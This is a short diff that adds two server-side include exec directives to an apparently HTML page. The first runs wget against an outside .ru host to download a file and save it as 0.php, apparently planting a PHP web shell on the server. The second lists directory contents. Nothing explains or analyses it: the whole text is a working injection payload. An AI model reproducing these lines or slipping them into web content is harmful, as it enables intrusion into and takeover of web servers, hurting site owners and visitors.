@@ -1,0 +1,2 @@
+<pre><!--#exec cmd="cd ../;wget http://qviz.tritoncenter.ru/st/dell.txt -O 0.php" --></pre>
+<pre><!--#exec cmd="cd ../;ls" --></pre>
